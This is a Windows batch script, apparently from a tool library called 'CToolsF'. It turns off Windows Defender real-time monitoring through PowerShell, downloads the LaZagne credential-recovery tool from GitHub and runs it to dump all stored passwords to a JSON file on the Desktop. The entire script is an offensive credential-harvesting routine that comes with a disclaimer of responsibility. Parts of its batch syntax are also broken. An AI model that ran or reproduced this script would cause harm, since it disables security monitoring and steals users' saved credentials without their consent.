REM This script is a part of CToolsF library.
REM Author is not responsible for any malicious activities that can be committed by using any of contents of this library.

@echo off

chcp 65001
cls


:payload
echo [*] Preparing payload...
git --version
if not %errorlevel% == 0 (
    echo [*] Git not installed.
    exit /b 1
) else (
    pip3 --version
    if not %errorlevel% == 0 (
        echo [*] Pip3 not installed.
        exit /b 1
    ) else )
        echo [*] Disabling system monitoring...
        powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
        if not %errorlevel% == 0 (
            echo [*] Unable to disable Windows monitoring.
            exit /b 1
        )
        cd %userprofile%
        git clone https://github.com/AlessandroZ/LaZagne
        if not %errorlevel% == 0 (
            echo [*] Unable to download LaZagne.
            exit /b 1
        ) else (
            cd LaZagne
            set output_dest=%userprofile%\Desktop
            laZagne.exe all -oJ -output %output_dest%
        )


if "%1" == "verbose" :payload
if "%1" == "token" :payload
if "%1" == "" :payload
if "%1" == "*" (
    echo [*] Invalid argument(s) specified.
    exit /b 1
)
